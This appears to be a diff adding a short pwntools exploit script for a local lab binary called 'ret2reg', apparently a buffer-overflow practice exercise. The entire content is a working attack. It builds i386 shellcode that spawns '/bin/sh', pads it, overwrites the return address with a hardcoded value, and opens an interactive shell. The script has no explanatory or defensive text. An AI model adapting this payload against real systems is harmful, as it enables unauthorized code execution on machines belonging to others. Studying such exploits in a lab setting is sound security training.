@@ -1,0 +1,11 @@
+from pwn import *
+
+#context.arch= 'i386'
+context(arch='i386',os='linux',log_level='debug')
+shellcode = asm(shellcraft.sh())
+#payload = shellcode + b"a"*(524-len(shellcode))+p32(0x5655601d)
+#payload = b"\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\x31\xc0\xb0\x0b\xcd\x80"+b"a"*499+p32(0x5655601d)
+payload = b"\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\x31\xc0\xb0\x0b\xcd\x80" + b"a"*499+b"\x1d\x60\x55\x56"
+p = process(argv=["./ret2reg", payload])
+
+p.interactive()
